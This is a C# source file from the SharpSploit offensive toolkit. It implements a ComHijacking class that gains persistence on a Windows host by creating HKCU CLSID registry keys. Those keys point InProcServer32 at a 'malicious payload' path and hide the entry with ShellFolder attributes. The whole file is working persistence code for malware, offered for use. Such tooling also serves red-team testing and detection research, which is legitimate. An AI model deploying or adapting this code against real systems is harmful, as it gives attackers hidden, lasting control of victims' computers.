// Author: Dennis Panagiotopoulos (@den_n1s)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SharpSploit.Persistence
{
    /// <summary>
    /// ComHijacking is a class that can be used in order to achieve peristence on a host via COM Hijacking. 
    /// </summary>
    public class ComHijacking
    {
        /// <summary>
        /// It utilises CLSID key abandonment and points InProvServer32 key to a malicious payload. 
        /// </summary>
        /// <remarks>
        /// Shoutout to @FuzzySec for his Powershell implementation of this technique
        /// </remarks>
        /// <param name="CLSID">Missing CLSID to abuse.</param>
        /// <param name="Path">Path to the malicious payload</param>
        public static string Persist(string CLSID, string Path)
        {
            Microsoft.Win32.RegistryKey key;

            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + CLSID + "}");
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + CLSID + "}\\InProcServer32");
            key.SetValue("", Path);
            key.SetValue("ThreadingModel", "Apartment");
            key.SetValue("LoadWithoutCOM", "");
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + CLSID + "}\\ShellFolder");
            key.SetValue("HideOnDesktop", "");
            key.SetValue("Attributes", unchecked((int)0xf090013d), Microsoft.Win32.RegistryValueKind.DWord);

            return "Persist has been achieved";
        } 
    }
}
